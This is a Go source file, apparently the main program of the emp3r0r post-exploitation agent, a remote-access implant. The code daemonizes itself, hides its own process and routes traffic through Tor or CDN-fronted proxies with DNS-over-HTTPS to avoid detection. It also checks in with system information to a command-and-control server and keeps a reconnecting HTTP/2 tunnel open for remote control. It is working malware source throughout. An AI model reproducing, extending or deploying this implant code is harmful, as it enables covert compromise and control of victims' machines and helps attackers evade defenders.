package main

import (
	"flag"
	"fmt"
	"io/ioutil"
	"log"
	"net"
	"os"
	"os/exec"
	"strings"
	"time"

	"github.com/jm33-m0/emp3r0r/core/internal/agent"
	"github.com/jm33-m0/emp3r0r/core/internal/tun"
	cdn2proxy "github.com/jm33-m0/go-cdn2proxy"
)

func main() {
	c2proxy := flag.String("proxy", "", "Proxy for emp3r0r agent's C2 communication")
	cdnProxy := flag.String("cdnproxy", "", "CDN proxy for emp3r0r agent's C2 communication")
	silent := flag.Bool("silent", false, "Suppress output")
	daemon := flag.Bool("daemon", false, "Daemonize")
	flag.Parse()

	// silent switch
	log.SetOutput(ioutil.Discard)
	if !*silent {
		fmt.Println("emp3r0r agent has started")
		log.SetOutput(os.Stderr)
	}

	// if the agent's process name is not "emp3r0r"
	alive, pid := agent.IsAgentRunningPID()
	if alive {
		proc, err := os.FindProcess(pid)
		if err != nil {
			log.Println("WTF? The agent is not running, or is it?")
		}

		// exit, leave the existing agent instance running
		if agent.IsAgentAlive() {
			log.Fatal("Agent is already running and responsive, aborting")
		}

		// if agent is not responsive, kill it, and start a new instance
		err = proc.Kill()
		if err != nil {
			log.Println("Failed to kill old emp3r0r", err)
		}
	}

	// start socket listener
	go socketListen()

	// daemonize
	if *daemon {
		args := os.Args[1:]
		i := 0
		for ; i < len(args); i++ {
			if args[i] == "-daemon=true" {
				args[i] = "-daemon=false"
				break
			}
		}
		cmd := exec.Command(os.Args[0], args...)
		err := cmd.Start()
		if err != nil {
			log.Fatal(err)
		}
		os.Exit(0)
	}

	// parse C2 address
	ccip := strings.Split(agent.CCAddress, "/")[2]
	// if not using IP as C2, we assume CC is proxied by CDN/tor, thus using default 443 port
	if tun.ValidateIP(ccip) {
		agent.CCAddress = fmt.Sprintf("%s:%s/", agent.CCAddress, agent.CCPort)
	} else {
		agent.CCAddress += "/"
	}

	// if CC is behind tor, a proxy is needed
	agent.HTTPClient = tun.EmpHTTPClient("")
	if tun.IsTor(agent.CCAddress) {
		log.Printf("CC is on TOR: %s", agent.CCAddress)
		if *c2proxy == "" {
			log.Fatalf("CC is on TOR (%s), you have to specify a tor proxy for it to work", agent.CCAddress)
		}
		if *c2proxy == "" {
			agent.HTTPClient = tun.EmpHTTPClient("socks5://127.0.0.1:9050")
		}
	}

	// if user specified a proxy, use it
	if *c2proxy != "" {
		agent.HTTPClient = tun.EmpHTTPClient(*c2proxy)
	}

	// if user wants to use CDN proxy
	if *cdnProxy != "" {
		go func() {
			// you can change DoH server here if needed
			err := cdn2proxy.StartProxy("127.0.0.1:10888", *cdnProxy, "https://9.9.9.9/dns-query")
			if err != nil {
				log.Fatal(err)
			}
		}()
		agent.HTTPClient = tun.EmpHTTPClient("socks5://127.0.0.1:10888")
	}

	// hide process of itself if possible
	err := agent.UpdateHIDE_PIDS()
	if err != nil {
		log.Print(err)
	}
connect:

	// check preset CC status URL, if CC is supposed to be offline, take a nap
	if !agent.IsCCOnline() {
		log.Println("CC not online")
		time.Sleep(time.Duration(agent.RandInt(1, 120)) * time.Minute)
	}

	// check in with system info
	err = agent.CheckIn()
	if err != nil {
		log.Println("CheckIn: ", err)
		time.Sleep(5 * time.Second)
		goto connect
	}
	log.Printf("Checked in on CC: %s", agent.CCAddress)

	// connect to MsgAPI, the JSON based h2 tunnel
	msgURL := agent.CCAddress + tun.MsgAPI
	conn, ctx, cancel, err := agent.ConnectCC(msgURL)
	agent.H2Json = conn
	if err != nil {
		log.Println("ConnectCC: ", err)
		time.Sleep(5 * time.Second)
		goto connect
	}
	log.Println("Connected to CC TunAPI")
	err = agent.CCMsgTun(ctx, cancel)
	if err != nil {
		log.Printf("CCMsgTun: %v, reconnecting...", err)
	}
	goto connect
}

// listen on a unix socket
func socketListen() {
	// if socket file exists
	if agent.IsFileExist(agent.SocketName) {
		log.Printf("%s exists, testing connection...", agent.SocketName)
		if agent.IsAgentAlive() {
			log.Fatalf("%s exists, and agent is alive, aborting", agent.SocketName)
		}
		err := os.Remove(agent.SocketName)
		if err != nil {
			log.Fatalf("Failed to delete socket: %v", err)
		}
	}

	l, err := net.Listen("unix", agent.SocketName)
	if err != nil {
		log.Fatal("listen error:", err)
	}

	for {
		fd, err := l.Accept()
		if err != nil {
			log.Fatal("accept error:", err)
		}
		go server(fd)
	}
}

// handle connections to our socket: echo whatever we get
func server(c net.Conn) {
	for {
		buf := make([]byte, 512)
		nr, err := c.Read(buf)
		if err != nil {
			return
		}

		data := buf[0:nr]
		log.Println("Server got:", string(data))
		_, err = c.Write(data)
		if err != nil {
			log.Printf("Write: %v", err)
		}
	}
}
